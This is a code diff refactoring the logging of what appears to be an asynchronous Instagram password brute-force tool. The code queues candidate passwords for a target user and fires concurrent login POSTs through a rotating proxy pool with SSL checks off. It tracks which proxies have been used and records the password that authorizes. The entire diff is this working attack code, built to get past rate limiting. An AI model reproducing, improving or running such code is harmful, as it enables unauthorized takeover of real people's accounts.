@@ -76,41 +76,42 @@ class LoginHandler(HandlerMixin):
         self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID
 
     async def attempt_single_login(self, loop, password):
-        log = self.create_logger('attack', ignore_config=True)
-        await log.start('Starting Single Login')
+        async with self.async_logger('attack', ignore_config=True) as log:
+            await log.start('Starting Single Login')
 
-        await self.passwords.put(password)
-        self.num_passwords = 1
+            await self.passwords.put(password)
+            self.num_passwords = 1
 
-        results = await self.attack(loop)
-        return results.results[0]
+            results = await self.attack(loop)
+            return results.results[0]
 
     async def attack(self, loop):
-        log = self.create_logger('attack', ignore_config=True)
+        async with self.async_logger('attack', ignore_config=True) as log:
+            log = self.create_logger('attack', ignore_config=True)
 
-        await self.prepopulate(loop)
+            await self.prepopulate(loop)
 
-        await log.start('Starting Attack')
-        results = await self.attempt_login(loop)
-        return results
+            await log.start('Starting Attack')
+            results = await self.attempt_login(loop)
+            return results
 
     async def prepopulate(self, loop):
-        log = self.create_logger('prepopulate', ignore_config=True)
+        async with self.async_logger('prepopulate', ignore_config=True) as log:
 
-        message = f'Generating All Attempts for User {self.user.username}.'
-        if self.limit:
-            message = f'Generating {self.limit} Attempts for User {self.user.username}.'
-        await log.start(message)
+            message = f'Generating All Attempts for User {self.user.username}.'
+            if self.limit:
+                message = f'Generating {self.limit} Attempts for User {self.user.username}.'
+            await log.start(message)
 
-        passwords = await self.user.get_new_attempts(loop, limit=self.limit)
-        if len(passwords) == 0:
-            raise NoPasswordsError()
+            passwords = await self.user.get_new_attempts(loop, limit=self.limit)
+            if len(passwords) == 0:
+                raise NoPasswordsError()
 
-        self.num_passwords = len(passwords)
-        for password in passwords:
-            await self.passwords.put(password)
+            self.num_passwords = len(passwords)
+            for password in passwords:
+                await self.passwords.put(password)
 
-        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
+            await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
 
     @property
     def _connector(self):
@@ -165,7 +166,6 @@ class LoginHandler(HandlerMixin):
         using different proxies, so this is the top level of a tree of nested
         concurrent IO operations.
         """
-        log = self.create_logger('attempt_login')
         scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
 
         async def generate_login_tasks(session):
@@ -177,55 +177,57 @@ class LoginHandler(HandlerMixin):
             is found since this will generate relatively quickly and the coroutines
             have not been run yet.
             """
+            log = self.create_logger('attempt_login', sync=True)
+
             while not self.passwords.empty():
                 password = await self.passwords.get()
                 if password:
-                    log.debug(f'Yielding Coroutine for Password {password}')
                     yield self.attempt_with_password(loop, session, password, scheduler)
 
-            await log.critical('Passwords Queue is Empty')
+            log.critical('Passwords Queue is Empty')
 
-        results = InstagramResults(results=[])
+        async with self.async_logger('attempt_login') as log:
+            results = InstagramResults(results=[])
 
-        await log.debug('Waiting on Start Event...')
-        await self.start_event.wait()
-        cookies = await self.cookies()
+            await log.debug('Waiting on Start Event...')
+            await self.start_event.wait()
+            cookies = await self.cookies()
 
-        async with aiohttp.ClientSession(
-            connector=self._connector,
-            cookies=cookies,
-            timeout=self._timeout,
-        ) as session:
+            async with aiohttp.ClientSession(
+                connector=self._connector,
+                cookies=cookies,
+                timeout=self._timeout,
+            ) as session:
 
-            gen = generate_login_tasks(session)
-            async for result, num_tries in limit_as_completed(gen, self.batch_size):
-                await log.info('Got Result!!')
-                # Generator Does Not Yield None on No More Coroutines
-                if result.conclusive:
-                    self.num_completed += 1
+                gen = generate_login_tasks(session)
+                async for result, num_tries in limit_as_completed(gen, self.batch_size):
+                    await log.info('Got Result!!')
+                    # Generator Does Not Yield None on No More Coroutines
+                    if result.conclusive:
+                        self.num_completed += 1
 
-                    await log.success(
-                        f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')
+                        await log.success(
+                            f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')
 
-                    if result.authorized:
-                        await scheduler.spawn(
-                            self.user.create_or_update_attempt(result.password, success=True))
-                        results.add(result)
-                        break
+                        if result.authorized:
+                            await scheduler.spawn(
+                                self.user.create_or_update_attempt(result.password, success=True))
+                            results.add(result)
+                            break
 
-                    else:
-                        if not result.not_authorized:
-                            raise RuntimeError('Result should not be authorized.')
+                        else:
+                            if not result.not_authorized:
+                                raise RuntimeError('Result should not be authorized.')
 
-                        results.add(result)
-                        await scheduler.spawn(
-                            self.user.create_or_update_attempt(result.password, success=False))
+                            results.add(result)
+                            await scheduler.spawn(
+                                self.user.create_or_update_attempt(result.password, success=False))
 
-        await log.complete('Closing Session')
-        await asyncio.sleep(0)
+            await log.complete('Closing Session')
+            await asyncio.sleep(0)
 
-        await scheduler.close()
-        return results
+            await scheduler.close()
+            return results
 
     async def attempt_with_password(self, loop, session, password, scheduler):
         """
@@ -244,7 +246,7 @@ class LoginHandler(HandlerMixin):
             is found since this will generate relatively quickly and the coroutines
             have not been run yet.
             """
-            log = self.create_logger('generate_login_attempts')
+            log = self.create_logger('attempt_with_password', sync=True)
 
             while True:
                 proxy = await self.proxy_handler.pool.get()
@@ -252,7 +254,7 @@ class LoginHandler(HandlerMixin):
                     raise PoolNoProxyError()
 
                 if proxy.unique_id in self.proxies_count:
-                    await log.warning(
+                    log.warning(
                         f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                         extra={'proxy': proxy}
                     )
@@ -270,20 +272,22 @@ class LoginHandler(HandlerMixin):
 
         # Wait for start event to signal that we are ready to start making
         # requests with the proxies.
-        await self.start_event.wait()
+        async with self.async_logger('attempt_with_password') as log:
 
-        await log.start(f'Atempting Login with {password}')
+            await self.start_event.wait()
 
-        gen = generate_login_attempts()
-        async for result, num_tries in limit_as_completed(gen, self.attempt_batch_size):
-            if result is not None:
-                await log.complete(
-                    f'Done Attempting Login with {password} '
-                    f'After {num_tries} Attempt(s)',
-                    extra={
-                        'other': result
-                    })
-                return result
+            await log.start(f'Atempting Login with {password}')
+
+            gen = generate_login_attempts()
+            async for result, num_tries in limit_as_completed(gen, self.attempt_batch_size):
+                if result is not None:
+                    await log.complete(
+                        f'Done Attempting Login with {password} '
+                        f'After {num_tries} Attempt(s)',
+                        extra={
+                            'other': result
+                        })
+                    return result
 
     async def login_request(self, loop, session, password, proxy, scheduler):
         """
@@ -312,8 +316,6 @@ class LoginHandler(HandlerMixin):
         >>>     else:
         >>>         raise e
         """
-        log = self.create_logger('login_request')
-
         proxy.update_time()
         result = None
 
@@ -353,37 +355,38 @@ class LoginHandler(HandlerMixin):
                     # Be Careful: If this doesn't raise a response the result will be None.
                     response.raise_for_status()
 
-        try:
-            async with session.post(
-                settings.INSTAGRAM_LOGIN_URL,
-                headers=self.headers,
-                data=self._login_data(password),
-                ssl=False,
-                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
-            ) as response:
+        async with self.async_logger('login_request') as log:
+            try:
+                async with session.post(
+                    settings.INSTAGRAM_LOGIN_URL,
+                    headers=self.headers,
+                    data=self._login_data(password),
+                    ssl=False,
+                    proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
+                ) as response:
 
-                result = await raise_for_result(response)
-                await proxy.handle_success()
-                await self.proxy_handler.pool.put(proxy)
+                    result = await raise_for_result(response)
+                    await proxy.handle_success()
+                    await self.proxy_handler.pool.put(proxy)
 
-        except asyncio.CancelledError:
-            await log.debug('Request Cancelled')
-            pass
+            except asyncio.CancelledError:
+                await log.debug('Request Cancelled')
+                pass
 
-        except HTTP_RESPONSE_ERRORS as e:
-            err = find_response_error(e)
-            if not err:
-                raise e
+            except HTTP_RESPONSE_ERRORS as e:
+                err = find_response_error(e)
+                if not err:
+                    raise e
 
-            await proxy.handle_error(err)
+                await proxy.handle_error(err)
 
-        except HTTP_REQUEST_ERRORS as e:
-            err = find_request_error(e)
-            if not err:
-                raise e
+            except HTTP_REQUEST_ERRORS as e:
+                err = find_request_error(e)
+                if not err:
+                    raise e
 
-            await proxy.handle_error(err)
+                await proxy.handle_error(err)
 
-        await self.proxy_handler.pool.check_and_put(proxy)
-        await scheduler.spawn(proxy.save())
-        return result
+            await self.proxy_handler.pool.check_and_put(proxy)
+            await scheduler.spawn(proxy.save())
+            return result
